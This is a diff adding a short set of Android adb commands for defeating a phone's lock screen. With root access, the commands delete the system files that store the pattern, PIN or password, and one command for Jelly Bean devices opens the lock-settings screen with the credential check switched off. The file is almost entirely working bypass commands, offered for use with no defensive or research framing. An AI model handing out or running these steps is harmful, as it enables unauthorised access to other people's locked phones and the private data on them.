@@ -1,0 +1,26 @@
+adb devices
+adb shell
+su
+rm /data/system/password.key or rm /data/system/gesture.key
+
+or adb shell rm /data/system/password.key
+
+=========================================================================
+i hope this method really works:
+#################################
+//it really needs a lot of explaination.
+
+For Rooted Phones . (FOR PATTERN BREAK)
+---------------------------------------
+adb shell rm /data/system/gesture.key 
+
+
+(FOR PASSWORD/PIN BREAK)
+adb shell rm /data/system/password.key
+
+
+
+(FOR ROOTED AND NON-ROOTED JELLY BEAN PHONES ONLY)
+---------------------------------------------------
+
+adb shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task
